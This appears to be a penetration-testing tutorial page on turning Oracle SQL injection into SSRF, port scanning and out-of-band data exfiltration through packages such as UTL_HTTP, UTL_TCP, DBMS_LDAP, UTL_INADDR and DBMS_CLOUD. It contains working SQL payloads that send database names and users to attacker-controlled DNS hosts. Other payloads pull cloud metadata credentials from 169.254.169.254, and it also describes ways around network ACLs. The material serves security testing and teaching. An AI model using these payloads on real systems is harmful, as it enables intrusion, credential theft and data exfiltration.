_body: "# Oracle injection\n\n{{#include ../../banners/hacktricks-training.md}}\n\n**Serve this post a wayback machine copy\
  \ of the deleted post from [https://ibreak.software/2020/06/using-sql-injection-to-perform-ssrf-xspa-attacks/](https://ibreak.software/2020/06/using-sql-injection-to-perform-ssrf-xspa-attacks/)**.\n\
  \n## SSRF\n\nUsing Oracle to do Out of Band HTTP and DNS requests is well documented but as a means of exfiltrating SQL\
  \ data in injections. We can always modify these techniques/functions to do other SSRF/XSPA.\n\nInstalling Oracle can be\
  \ really painful, especially if you want to set up a quick instance to try out commands. My friend and colleague at [Appsecco](https://appsecco.com),\
  \ [Abhisek Datta](https://github.com/abhisek), pointed me to [https://github.com/MaksymBilenko/docker-oracle-12c](https://github.com/MaksymBilenko/docker-oracle-12c)\
  \ that allowed me to setup an instance on a t2.large AWS Ubuntu machine and Docker.\n\nI ran the docker command with the\
  \ `--network=\"host\"` flag so that I could mimic Oracle as an native install with full network access, for the course of\
  \ this blogpost.\n\n```\ndocker run -d --network=\"host\" quay.io/maksymbilenko/oracle-12c\n```\n\n#### Oracle packages\
  \ that support a URL or a Hostname/Port Number specification <a href=\"#oracle-packages-that-support-a-url-or-a-hostname-port-number-specification\"\
  \ id=\"oracle-packages-that-support-a-url-or-a-hostname-port-number-specification\"></a>\n\nIn order to find any packages\
  \ and functions that support a host and port specification, I ran a Google search on the [Oracle Database Online Documentation](https://docs.oracle.com/database/121/index.html).\
  \ Specifically,\n\n```\nsite:docs.oracle.com inurl:\"/database/121/ARPLS\" \"host\"|\"hostname\" \"port\"|\"portnum\"\n\
  ```\n\nThe search returned the following results (not all can be used to perform outbound network)\n\n- DBMS_NETWORK_ACL_ADMIN\n\
  - UTL_SMTP\n- DBMS_XDB\n- DBMS_SCHEDULER\n- DBMS_XDB_CONFIG\n- DBMS_AQ\n- UTL_MAIL\n- DBMS_AQELM\n- DBMS_NETWORK_ACL_UTILITY\n\
  - DBMS_MGD_ID_UTL\n- UTL_TCP\n- DBMS_MGWADM\n- DBMS_STREAMS_ADM\n- UTL_HTTP\n\nThis crude search obviously skips packages\
  \ like `DBMS_LDAP` (which allows passing a hostname and port number) as [the documentation page](https://docs.oracle.com/database/121/ARPLS/d_ldap.htm#ARPLS360)\
  \ simply points you to a [different location](https://docs.oracle.com/database/121/ARPLS/d_ldap.htm#ARPLS360). Hence, there\
  \ may be other Oracle packages that can be abused to make outbound requests that I may have missed.\n\nIn any case, let’s\
  \ take a look at some of the packages that we have discovered and listed above.\n\n**DBMS_LDAP.INIT**\n\nThe `DBMS_LDAP`\
  \ package allows for access of data from LDAP servers. The `init()` function initializes a session with an LDAP server and\
  \ takes a hostname and port number as an argument.\n\nThis function has been documented before to show exfiltration of data\
  \ over DNS, like below\n\n```\nSELECT DBMS_LDAP.INIT((SELECT version FROM v$instance)||'.'||(SELECT user FROM dual)||'.'||(select\
  \ name from V$database)||'.'||'d4iqio0n80d5j4yg7mpu6oeif9l09p.burpcollaborator.net',80) FROM dual;\n```\n\nHowever, given\
  \ that the function accepts a hostname and a port number as arguments, you can use this to work like a port scanner as well.\n\
  \nHere are a few examples\n\n```\nSELECT DBMS_LDAP.INIT('scanme.nmap.org',22) FROM dual;\nSELECT DBMS_LDAP.INIT('scanme.nmap.org',25)\
  \ FROM dual;\nSELECT DBMS_LDAP.INIT('scanme.nmap.org',80) FROM dual;\nSELECT DBMS_LDAP.INIT('scanme.nmap.org',8080) FROM\
  \ dual;\n```\n\nA `ORA-31203: DBMS_LDAP: PL/SQL - Init Failed.` shows that the port is closed while a session value points\
  \ to the port being open.\n\n**UTL_SMTP**\n\nThe `UTL_SMTP` package is designed for sending e-mails over SMTP. The example\
  \ provided on the [Oracle documentation site shows how you can use this package to send an email](https://docs.oracle.com/database/121/ARPLS/u_smtp.htm#ARPLS71478).\
  \ For us, however, the interesting thing is with the ability to provide a host and port specification.\n\nA crude example\
  \ is shown below with the `UTL_SMTP.OPEN_CONNECTION` function, with a timeout of 2 seconds\n\n```\nDECLARE c utl_smtp.connection;\n\
  BEGIN\nc := UTL_SMTP.OPEN_CONNECTION('scanme.nmap.org',80,2);\nEND;\n```\n\n```\nDECLARE c utl_smtp.connection;\nBEGIN\n\
  c := UTL_SMTP.OPEN_CONNECTION('scanme.nmap.org',8080,2);\nEND;\n```\n\nA `ORA-29276: transfer timeout` shows port is open\
  \ but no SMTP connection was estabilished while a `ORA-29278: SMTP transient error: 421 Service not available` shows that\
  \ the port is closed.\n\n**UTL_TCP**\n\nThe `UTL_TCP` package and its procedures and functions allow [TCP/IP based communication\
  \ with services](https://docs.oracle.com/cd/B28359_01/appdev.111/b28419/u_tcp.htm#i1004190). If programmed for a specific\
  \ service, this package can easily become a way into the network or perform full Server Side Requests as all aspects of\
  \ a TCP/IP connection can be controlled.\n\nThe example [on the Oracle documentation site shows how you can use this package\
  \ to make a raw TCP connection to fetch a web page](https://docs.oracle.com/cd/B28359_01/appdev.111/b28419/u_tcp.htm#i1004190).\
  \ We can simply it a little more and use it to make requests to the metadata instance for example or to an arbitrary TCP/IP\
  \ service.\n\n```\nset serveroutput on size 30000;\nSET SERVEROUTPUT ON\nDECLARE c utl_tcp.connection;\n  retval pls_integer;\n\
  BEGIN\n  c := utl_tcp.open_connection('169.254.169.254',80,tx_timeout => 2);\n  retval := utl_tcp.write_line(c, 'GET /latest/meta-data/\
  \ HTTP/1.0');\n  retval := utl_tcp.write_line(c);\n  BEGIN\n    LOOP\n      dbms_output.put_line(utl_tcp.get_line(c, TRUE));\n\
  \    END LOOP;\n  EXCEPTION\n    WHEN utl_tcp.end_of_input THEN\n      NULL;\n  END;\n  utl_tcp.close_connection(c);\nEND;\n\
  /\n```\n\n```\nDECLARE c utl_tcp.connection;\n  retval pls_integer;\nBEGIN\n  c := utl_tcp.open_connection('scanme.nmap.org',22,tx_timeout\
  \ => 4);\n  retval := utl_tcp.write_line(c);\n  BEGIN\n    LOOP\n      dbms_output.put_line(utl_tcp.get_line(c, TRUE));\n\
  \    END LOOP;\n  EXCEPTION\n    WHEN utl_tcp.end_of_input THEN\n      NULL;\n  END;\n  utl_tcp.close_connection(c);\nEND;\n\
  ```\n\nInterestingly, due to the ability to craft raw TCP requests, this package can also be used to query the Instance\
  \ meta-data service of all cloud providers as the method type and additional headers can all be passed within the TCP request.\n\
  \n**UTL_HTTP and Web Requests**\n\nPerhaps the most common and widely documented technique in every Out of Band Oracle SQL\
  \ Injection tutorial out there is the [`UTL_HTTP` package](https://docs.oracle.com/database/121/ARPLS/u_http.htm#ARPLS070).\
  \ This package is defined by the documentation as - `The UTL_HTTP package makes Hypertext Transfer Protocol (HTTP) callouts\
  \ from SQL and PL/SQL. You can use it to access data on the Internet over HTTP.`\n\n```\nselect UTL_HTTP.request('http://169.254.169.254/latest/meta-data/iam/security-credentials/adminrole')\
  \ from dual;\n```\n\nYou could additionally, use this to perform some rudimentary port scanning as well with queries like\n\
  \n```\nselect UTL_HTTP.request('http://scanme.nmap.org:22') from dual;\nselect UTL_HTTP.request('http://scanme.nmap.org:8080')\
  \ from dual;\nselect UTL_HTTP.request('http://scanme.nmap.org:25') from dual;\n```\n\nA `ORA-12541: TNS:no listener` or\
  \ a `TNS:operation timed out` is a sign that the TCP port is closed, whereas a `ORA-29263: HTTP protocol error` or data\
  \ is a sign that the port is open.\n\nAnother package I have used in the past with varied success is the [`GETCLOB()` method\
  \ of the `HTTPURITYPE` Oracle abstract type](https://docs.oracle.com/database/121/ARPLS/t_dburi.htm#ARPLS71705) that allows\
  \ you to interact with a URL and provides support for the HTTP protocol. The `GETCLOB()` method is used to fetch the GET\
  \ response from a URL as a [CLOB data type.](https://docs.oracle.com/javadb/10.10.1.2/ref/rrefclob.html)\n\n```\nSELECT\
  \ HTTPURITYPE('http://169.254.169.254/latest/meta-data/instance-id').getclob() FROM dual;\n```\n\n---\n\n## Additional Packages\
  \ & Techniques (Oracle 19c → 23c)\n\n### UTL_INADDR – DNS-based exfiltration and host discovery\n\n`UTL_INADDR` exposes\
  \ simple name-resolution helpers that trigger an outbound DNS lookup from the database host.  Because only a domain is required\
  \ (no port/ACL needed) it is a reliable primitive for blind-exfil when other network callouts are blocked.\n\n```sql\n--\
  \ Leak the DB name and current user via a DNS query handled by Burp Collaborator\nSELECT UTL_INADDR.get_host_address(\n\
  \         (SELECT name FROM v$database)||'.'||(SELECT user FROM dual)||\n         '.attacker.oob.server') FROM dual;\n```\n\
  \n`get_host_address()` returns the resolved IP (or raises `ORA-29257` if resolution fails).  The attacker only needs to\
  \ watch for the incoming DNS request on the controlled domain to confirm code execution.\n\n### DBMS_CLOUD.SEND_REQUEST\
  \ – full HTTP client on Autonomous/23c\n\nRecent cloud-centric editions (Autonomous Database, 21c/23c, 23ai) ship with `DBMS_CLOUD`.\
  \  The `SEND_REQUEST` function acts as a general-purpose HTTP client that supports custom verbs, headers, TLS and large\
  \ bodies, making it far more powerful than the classical `UTL_HTTP`.\n\n```sql\n-- Assuming the current user has CREATE\
  \ CREDENTIAL and network ACL privileges\nBEGIN\n  -- empty credential when no auth is required\n  DBMS_CLOUD.create_credential(\n\
  \      credential_name => 'NOAUTH',\n      username        => 'ignored',\n      password        => 'ignored');\nEND;\n/\n\
  \nDECLARE\n  resp  DBMS_CLOUD_TYPES.resp;\nBEGIN\n  resp := DBMS_CLOUD.send_request(\n             credential_name => 'NOAUTH',\n\
  \             uri             => 'http://169.254.169.254/latest/meta-data/',\n             method          => 'GET',\n \
  \            timeout         => 3);\n  dbms_output.put_line(DBMS_CLOUD.get_response_text(resp));\nEND;\n/\n```\n\nBecause\
  \ `SEND_REQUEST` allows arbitrary target URIs it can be abused via SQLi for:\n1. Internal port scanning / SSRF to cloud\
  \ metadata services.\n2. Out-of-band exfiltration over HTTPS (use Burp Collaborator or an `ngrok` tunnel).\n3. Callbacks\
  \ to attacker servers even when older callout packages are disabled by ACLs.\n\nℹ️ If you only have a classical on-prem\
  \ 19c but can create Java stored procedures, you can sometimes install `DBMS_CLOUD` from the OCI client bundle — useful\
  \ in some engagements.\n\n### Automating the attack surface with **ODAT**\n\n[ODAT – Oracle Database Attacking Tool](https://github.com/quentinhardy/odat)\
  \ has kept pace with modern releases (tested up to 19c, 5.1.1 – Apr-2022).  The `–utl_http`, `–utl_tcp`, `–httpuritype`\
  \ and newer `–dbms_cloud` modules automatically:\n* Detect usable callout packages/ACL grants.\n* Trigger DNS & HTTP callbacks\
  \ for blind extraction.\n* Generate ready-to-copy SQL payloads for Burp/SQLMap.\n\nExample: quick OOB check with default\
  \ creds (takes care of ACL enumeration in the background):\n\n```bash\nodat all -s 10.10.10.5 -p 1521 -d XE -U SCOTT -P\
  \ tiger --modules oob\n```\n\n### Recent network ACL restrictions & bypasses\n\nOracle tightened default Network ACLs in\
  \ the July 2023 CPU — unprivileged accounts now receive `ORA-24247: network access denied by access control list` by default.\
  \  Two patterns still allow callouts through SQLi:\n1. Target account owns an ACL entry (`DBMS_NETWORK_ACL_ADMIN.create_acl`)\
  \ that was added by a developer for integrations.\n2. The attacker abuses a high-privilege PL/SQL definer-rights routine\
  \ (e.g. in a custom application) that *already* has `AUTHID DEFINER` and the necessary grants.\n\nIf you encounter `ORA-24247`\
  \ during exploitation always search for reusable procedures:\n\n```sql\nSELECT owner, object_name\nFROM   dba_objects\n\
  WHERE  object_type = 'PROCEDURE'\n  AND  authid       = 'DEFINER';\n```\n\n(in many audits at least one reporting/export\
  \ procedure had the needed rights).\n\n---\n\n## References\n\n* Oracle Docs – `DBMS_CLOUD.SEND_REQUEST` package description\
